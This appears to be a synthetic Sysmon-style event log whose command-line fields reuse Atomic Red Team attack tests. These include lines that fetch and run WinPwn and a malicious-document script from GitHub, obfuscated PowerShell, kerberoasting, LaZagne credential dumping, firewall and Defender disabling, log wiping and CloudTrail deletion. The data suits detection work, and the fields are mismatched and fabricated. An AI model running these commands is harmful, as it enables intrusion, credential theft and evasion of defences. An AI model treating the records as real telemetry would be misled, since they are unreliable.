    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-30.garcia.com",
        "User": "ysmith",
        "ProcessID": 3285,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"# Set the remote computer name and credentials\\n $RemoteComputer = \\\"#{dest}\\\"\\n $PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\n\\n # Create a CIM session\\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\\n\\n # Define the process you want to start\\n $ProcessToStart = \\\"#{process}\\\"\\n\\n # Invoke the Create method on the Win32_Process class to start the process\\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\\n\\n # Check the result\\n if ($Result.ReturnValue -eq 0) {\\n     Write-Host \\\"Process started successfully with Process ID: $($Result.ProcessId)\\\"\\n } else {\\n     Write-Host \\\"Failed to start the process. Error code: $($Result.ReturnValue)\\\"\\n }\\n\\n # Clean up the CIM session\\n Remove-CimSession -CimSession $CimSession \\n\",",
        "LogonID": 520094,
        "LogonGuid": "8a917df5-9cb1-42d5-a181-84194d6d98b1",
        "SourceProcessID": 7747,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\heavy..dll",
        "DestinationProcessID": 6411,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\edge..exe",
        "UtcTime": "2024-05-17T01:36:51.839035Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-33.garza.info",
        "User": "lesliefernandez",
        "ProcessID": 3131,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Set-Location \\\"PathToAtomicsFolder\\\"\\n.\\\\T1572\\\\src\\\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\\n\",",
        "LogonID": 901390,
        "LogonGuid": "5abe9257-5741-4fff-9571-ce1a6b953130",
        "SourceProcessID": 9420,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\line..dll",
        "DestinationProcessID": 2846,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\here..dll",
        "UtcTime": "2024-05-17T01:36:51.839035Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-72.gardner-wiggins.biz",
        "User": "stevemartinez",
        "ProcessID": 6084,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \\ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\\ndocker exec -i t1609_container bash -c \\\"cat /tmp/output.txt\\\"\\n\",",
        "LogonID": 718000,
        "LogonGuid": "cf3c8bba-8090-46a2-a35e-5aa32f41441b",
        "SourceProcessID": 6948,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\would..dll",
        "DestinationProcessID": 3325,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\role..exe",
        "UtcTime": "2024-05-17T01:36:51.839035Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-19.moore-vega.net",
        "User": "savagemark",
        "ProcessID": 1191,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$PathToAtomicsFolder\\\\T1055.004\\\\bin\\\\x64\\\\EarlyBird.exe -program \\\"#{spawn_process_path}\\\" -debug\\n\",",
        "LogonID": 894201,
        "LogonGuid": "78cc212d-b4fe-45cc-9db4-da4240db3f35",
        "SourceProcessID": 2729,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\threat..dll",
        "DestinationProcessID": 5646,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\through..dll",
        "UtcTime": "2024-05-17T01:36:51.839035Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-45.callahan.info",
        "User": "bjones",
        "ProcessID": 3535,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"InfDefaultInstall.exe \\\"#{inf_to_execute}\\\"\\n\",",
        "LogonID": 387220,
        "LogonGuid": "3e72f565-6eeb-420b-b5d9-3c8f240238dd",
        "SourceProcessID": 3280,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\company..dll",
        "DestinationProcessID": 7546,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\our..exe",
        "UtcTime": "2024-05-17T01:36:51.839035Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-67.brennan-morrison.com",
        "User": "fbates",
        "ProcessID": 1460,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"copy \\\"#{filename}\\\" %TEMP%\\\\hello.js\\n#{jscpath}\\\\#{jscname} %TEMP%\\\\hello.js\\n\",",
        "LogonID": 991470,
        "LogonGuid": "76514042-6f7a-41e3-9ce5-10710e22492d",
        "SourceProcessID": 7213,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\require..dll",
        "DestinationProcessID": 6567,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\building..dll",
        "UtcTime": "2024-05-17T01:36:51.840036Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-22.tucker.org",
        "User": "brianchung",
        "ProcessID": 7774,
        "ProcessName": "nc.exe",
        "CommandLine": "\"xattr -lr * / 2>&1 /dev/null | grep -C 2 \\\"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\\\"\\n\",",
        "LogonID": 756583,
        "LogonGuid": "758308df-ad8d-4255-8760-9e14b379fb26",
        "SourceProcessID": 4025,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\group..dll",
        "DestinationProcessID": 7574,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\father..dll",
        "UtcTime": "2024-05-17T01:36:51.840036Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-21.smith.com",
        "User": "derrick69",
        "ProcessID": 7551,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"certutil -addstore my #{pfx_path}\\n\",",
        "LogonID": 169478,
        "LogonGuid": "c7616530-f925-4f4f-8191-918bd24bb364",
        "SourceProcessID": 9216,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\ok..exe",
        "DestinationProcessID": 2228,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\role..exe",
        "UtcTime": "2024-05-17T01:36:51.840036Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-36.hall.biz",
        "User": "bcase",
        "ProcessID": 4488,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"reg query HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Nls\\\\Language\\n\",",
        "LogonID": 383414,
        "LogonGuid": "5246d49c-2daa-405f-a8b9-c6b0fa41ce6f",
        "SourceProcessID": 7885,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\collection..dll",
        "DestinationProcessID": 8316,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\only..dll",
        "UtcTime": "2024-05-17T01:36:51.840036Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-02.ho.com",
        "User": "eaustin",
        "ProcessID": 4207,
        "ProcessName": "malware.exe",
        "CommandLine": "\"dscl . list /Groups\\ndscl . list /Users\\ndscl . list /Users | grep -v '_'\\ndscacheutil -q group\\ndscacheutil -q user\\n\",",
        "LogonID": 173164,
        "LogonGuid": "459e885e-e455-4b2c-bb37-4b8551feb8ba",
        "SourceProcessID": 4941,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\world..exe",
        "DestinationProcessID": 1906,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\already..dll",
        "UtcTime": "2024-05-17T01:36:51.840036Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-56.rodriguez-james.com",
        "User": "ashley47",
        "ProcessID": 4628,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$credFile = \\\"#{cred_file}\\\"\\nif (Test-Path $credFile) {\\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\\n    if($cred.GetNetworkCredential().Password -eq \\\"#{new_password}\\\"){\\n      Write-Host -ForegroundColor Yellow \\\"The new password is the same as the password stored in the credential file. Please specify a different new password.\\\"; exit -1\\n    }\\n    try {\\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\\n    }\\n    catch { \\n        $_.Exception\\n        $errCode = $_.Exception.ErrorCode\\n        Write-Host \\\"Error code: $errCode\\\"\\n        if ($errCode -eq 86) {\\n            Write-Host -ForegroundColor Yellow \\\"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\\\"\\n            Remove-Item $credFile\\n        }\\n        exit $errCode\\n    }\\n    Write-Host -ForegroundColor Cyan \\\"Successfully changed the password to #{new_password}\\\"\\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \\\"#{new_password}\\\" -AsPlainText -Force))\\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\\n}\\nelse {\\n    Write-Host -ForegroundColor Yellow \\\"You must store the password of the current user by running the prerequisite commands first\\\"\\n}\\n\",",
        "LogonID": 792118,
        "LogonGuid": "c7b0682b-3378-4c0b-91b9-332f5f4017f1",
        "SourceProcessID": 2535,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\consider..exe",
        "DestinationProcessID": 3246,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\tree..dll",
        "UtcTime": "2024-05-17T01:36:51.841035Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-54.cox-moore.com",
        "User": "zmunoz",
        "ProcessID": 1713,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$cmDwhy =[TyPe](\\\"{0}{1}\\\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\\\"{1}{0}{2}\\\"-f'nv','cO','ert')  ;  &(\\\"{0}{2}{3}{1}{4}\\\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\\\"{1}{2}{0}\\\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\\\"v`ALUe\\\"::(\\\"{1}{0}\\\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\\\"t`OinT`16\\\"(( [sTring]${_}) ,8)))})) )\\n\",",
        "LogonID": 849239,
        "LogonGuid": "c861e7ae-1423-4b42-9b7c-f757594d51fc",
        "SourceProcessID": 9723,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\seven..exe",
        "DestinationProcessID": 6088,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\south..dll",
        "UtcTime": "2024-05-17T01:36:51.841035Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-57.haley.com",
        "User": "christine58",
        "ProcessID": 8890,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"#{curl_path} -k #{file_download} -o c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll\\n#{curl_path} -k #{file_download} --output c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll\\n#{curl_path} -k #{file_download} -o c:\\\\programdata\\\\allthethingsx64.dll\\n#{curl_path} -k #{file_download} -o %Temp%\\\\allthethingsx64.dll\\n\",",
        "LogonID": 455718,
        "LogonGuid": "554e4a4b-8e5f-4c74-9fe6-b5df0debbd3d",
        "SourceProcessID": 9349,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\story..dll",
        "DestinationProcessID": 5310,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\thus..exe",
        "UtcTime": "2024-05-17T01:36:51.841035Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-27.anderson.biz",
        "User": "tyler11",
        "ProcessID": 2617,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\\nif [ -f \\\"/etc/#{auditd_config_file_name}\\\" ];\\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\\nfi \\nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}\\n\",",
        "LogonID": 913250,
        "LogonGuid": "3585a454-8e7c-4f8e-9598-abf800f1402e",
        "SourceProcessID": 5507,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\ask..exe",
        "DestinationProcessID": 5244,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\from..exe",
        "UtcTime": "2024-05-17T01:36:51.841035Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-16.khan-marshall.org",
        "User": "thomaschris",
        "ProcessID": 1863,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"swift #{swift_src} -keylog\\n\",",
        "LogonID": 915833,
        "LogonGuid": "7c2b3ae1-a855-44a2-99ef-a488452e2f1b",
        "SourceProcessID": 5511,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\return..exe",
        "DestinationProcessID": 6400,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\memory..dll",
        "UtcTime": "2024-05-17T01:36:51.841035Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-73.williams-joseph.com",
        "User": "floresmichelle",
        "ProcessID": 8338,
        "ProcessName": "malware.exe",
        "CommandLine": "\"net accounts /domain\\n\",",
        "LogonID": 789705,
        "LogonGuid": "3e4c0348-b255-41c2-8bbf-e0b50a00f20a",
        "SourceProcessID": 1765,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\future..exe",
        "DestinationProcessID": 8343,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\alone..dll",
        "UtcTime": "2024-05-17T01:36:51.841035Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-70.griffith.com",
        "User": "cynthiawallace",
        "ProcessID": 5951,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"klist purge\\ncmd.exe /c \\\"#{local_folder}\\\\#{local_executable}\\\" kerberoast #{flags} /outfile:\\\"#{local_folder}\\\\#{out_file}\\\"\\n\",",
        "LogonID": 869981,
        "LogonGuid": "75218503-4f89-4b21-94f3-cf254ef17973",
        "SourceProcessID": 6487,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\sister..dll",
        "DestinationProcessID": 8325,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\case..exe",
        "UtcTime": "2024-05-17T01:36:51.842036Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-72.robinson.com",
        "User": "heatherhodge",
        "ProcessID": 2605,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \\\"CN=Users,DC=#{domain},DC=#{top_level_domain}\\\" -s sub -a always -z 1000 dn\\n\",",
        "LogonID": 289982,
        "LogonGuid": "54e30b2f-737e-4dcb-8b18-838555c4929b",
        "SourceProcessID": 3557,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\area..dll",
        "DestinationProcessID": 9399,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\near..dll",
        "UtcTime": "2024-05-17T01:36:51.842036Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-00.miller-bennett.com",
        "User": "perkinsjade",
        "ProcessID": 4692,
        "ProcessName": "malware.exe",
        "CommandLine": "\"wmic qfe get description,installedOn /format:csv\\n\",",
        "LogonID": 343838,
        "LogonGuid": "1a1bcf1b-e7c8-414d-9de3-e488f9b00c49",
        "SourceProcessID": 7276,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\same..exe",
        "DestinationProcessID": 5133,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\ask..exe",
        "UtcTime": "2024-05-17T01:36:51.842036Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-52.cooley.com",
        "User": "pamelachambers",
        "ProcessID": 5717,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"IF EXIST \\\"%temp%\\\\Windows_Defender_Scheduled_Scan.xml\\\" ( schtasks /delete /tn \\\"\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Scheduled Scan\\\" /f )\\nIF EXIST \\\"%temp%\\\\Windows_Defender_Cleanup.xml\\\" ( schtasks /delete /tn \\\"\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cleanup\\\" /f )\\nIF EXIST \\\"%temp%\\\\Windows_Defender_Verification.xml\\\" ( schtasks /delete /tn \\\"\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Verification\\\" /f )\\nIF EXIST \\\"%temp%\\\\Windows_Defender_Cache_Maintenance.xml\\\" ( schtasks /delete /tn \\\"\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cache Maintenance\\\" /f )\\n\",",
        "LogonID": 664358,
        "LogonGuid": "37a138f1-4623-4ed3-ad3e-d08f7f9887fa",
        "SourceProcessID": 7406,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\growth..dll",
        "DestinationProcessID": 9371,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\return..dll",
        "UtcTime": "2024-05-17T01:36:51.842036Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-35.alvarado.com",
        "User": "kimberlylawson",
        "ProcessID": 9180,
        "ProcessName": "nc.exe",
        "CommandLine": "\"wscript \\\"#{jscript}\\\"\\n\",",
        "LogonID": 133184,
        "LogonGuid": "a56d48fb-9deb-4172-a919-e9b600bb4911",
        "SourceProcessID": 3268,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\letter..exe",
        "DestinationProcessID": 4806,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\discuss..exe",
        "UtcTime": "2024-05-17T01:36:51.842036Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-80.garcia-walters.com",
        "User": "kelly33",
        "ProcessID": 8722,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"cat /dev/null > /var/log/messages #truncating the file to zero bytes\\ncat /dev/zero > /var/lol/messages #log file filled with null bytes(zeros)\\n\",",
        "LogonID": 661572,
        "LogonGuid": "9a2ea379-f23f-424c-876f-f2b9572ec0cf",
        "SourceProcessID": 8201,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\actually..dll",
        "DestinationProcessID": 8293,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\role..dll",
        "UtcTime": "2024-05-17T01:36:51.842036Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-30.ortiz.biz",
        "User": "deniseclark",
        "ProcessID": 1230,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Get-ChildItem -Path C:\\\\Users\\\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\\n\",",
        "LogonID": 256785,
        "LogonGuid": "0d4ea89a-0ff4-487c-a427-3cbac431c678",
        "SourceProcessID": 4723,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\amount..dll",
        "DestinationProcessID": 8120,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\bad..exe",
        "UtcTime": "2024-05-17T01:36:51.842036Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-52.collins.com",
        "User": "kimberlyyoung",
        "ProcessID": 7257,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\n$macrocode = \\\"   Open `\\\"#{bat_path}`\\\" For Output As #1`n   Write #1, `\\\"calc.exe`\\\"`n   Close #1`n   a = Shell(`\\\"cmd.exe /c #{bat_path} `\\\", vbNormalFocus)`n\\\"\\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\\n\",",
        "LogonID": 796900,
        "LogonGuid": "7261838c-4019-4e56-b44b-ac2369c4a2a5",
        "SourceProcessID": 9059,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\increase..dll",
        "DestinationProcessID": 4705,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\grow..dll",
        "UtcTime": "2024-05-17T01:36:51.843542Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-20.parker.biz",
        "User": "chavezmiranda",
        "ProcessID": 3813,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"aws iam create-user --user-name #{username}\\n\",",
        "LogonID": 439823,
        "LogonGuid": "160d7f07-2a1e-49e4-9806-da7e64bb9d27",
        "SourceProcessID": 6413,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\husband..dll",
        "DestinationProcessID": 8044,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\key..exe",
        "UtcTime": "2024-05-17T01:36:51.844059Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-73.sanders-jackson.org",
        "User": "johndouglas",
        "ProcessID": 5361,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"#{curl_path} -k #{file_download} -o c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll\\n#{curl_path} -k #{file_download} --output c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll\\n#{curl_path} -k #{file_download} -o c:\\\\programdata\\\\allthethingsx64.dll\\n#{curl_path} -k #{file_download} -o %Temp%\\\\allthethingsx64.dll\\n\",",
        "LogonID": 621119,
        "LogonGuid": "5e796374-32f4-48cf-92bb-ed0d270ec22c",
        "SourceProcessID": 4207,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\describe..dll",
        "DestinationProcessID": 7352,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\worker..exe",
        "UtcTime": "2024-05-17T01:36:51.844059Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-57.smith.com",
        "User": "nathanwhite",
        "ProcessID": 3605,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}\",",
        "LogonID": 632317,
        "LogonGuid": "d4a148fb-b1da-4f08-bbd6-7b9fc596b2ba",
        "SourceProcessID": 7052,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\choose..dll",
        "DestinationProcessID": 7528,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\measure..dll",
        "UtcTime": "2024-05-17T01:36:51.844059Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-90.wong-willis.com",
        "User": "kellybaird",
        "ProcessID": 8659,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\npasshunt -local $true -noninteractive\",",
        "LogonID": 582362,
        "LogonGuid": "d2cadc0d-d840-4156-b354-7c711f7b1354",
        "SourceProcessID": 4289,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\yard..exe",
        "DestinationProcessID": 2838,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\manager..dll",
        "UtcTime": "2024-05-17T01:36:51.844059Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-09.edwards.com",
        "User": "schneidermariah",
        "ProcessID": 9595,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Mount-DiskImage -ImagePath \\\"#{path_of_iso}\\\"\\n\",",
        "LogonID": 999483,
        "LogonGuid": "ca78995e-1579-4ed5-81c3-3c8f1b5fdfcc",
        "SourceProcessID": 5072,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\anyone..dll",
        "DestinationProcessID": 7610,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\task..dll",
        "UtcTime": "2024-05-17T01:36:51.844059Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-45.vargas.com",
        "User": "daviszachary",
        "ProcessID": 9006,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v NoFileMenu /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 658622,
        "LogonGuid": "af3db096-815e-4079-8e9f-a91d973e4259",
        "SourceProcessID": 6117,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\western..dll",
        "DestinationProcessID": 8147,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\inside..exe",
        "UtcTime": "2024-05-17T01:36:51.844059Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-75.horn-hansen.com",
        "User": "kwerner",
        "ProcessID": 7445,
        "ProcessName": "malware.exe",
        "CommandLine": "\"New-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\\nNew-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\\n\",",
        "LogonID": 813285,
        "LogonGuid": "95446737-c635-44cc-be25-5499c104b6c2",
        "SourceProcessID": 3551,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\all..dll",
        "DestinationProcessID": 8311,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\central..exe",
        "UtcTime": "2024-05-17T01:36:51.845064Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-69.riddle-gonzalez.com",
        "User": "amanda59",
        "ProcessID": 2531,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"echo \\\"\\\" | \\\"#{plink_file}\\\" \\\"#{vm_host}\\\" -ssh  -l \\\"#{vm_user}\\\" -pw \\\"#{vm_pass}\\\" -m \\\"#{cli_script}\\\"\\n\",",
        "LogonID": 113350,
        "LogonGuid": "8ecd4379-c7dc-433f-afb4-2a2675eba03e",
        "SourceProcessID": 3016,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\might..exe",
        "DestinationProcessID": 8904,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\watch..exe",
        "UtcTime": "2024-05-17T01:36:51.845064Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-72.ferguson-salazar.com",
        "User": "mary58",
        "ProcessID": 2544,
        "ProcessName": "nc.exe",
        "CommandLine": "\"aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}\\naws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}\\naws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}\\n\",",
        "LogonID": 535401,
        "LogonGuid": "705ab4dc-3393-43c0-a4b3-ba6569b06051",
        "SourceProcessID": 2899,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\shake..exe",
        "DestinationProcessID": 2492,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\magazine..exe",
        "UtcTime": "2024-05-17T01:36:51.845064Z"
    },
    {
        "EventID": 11,
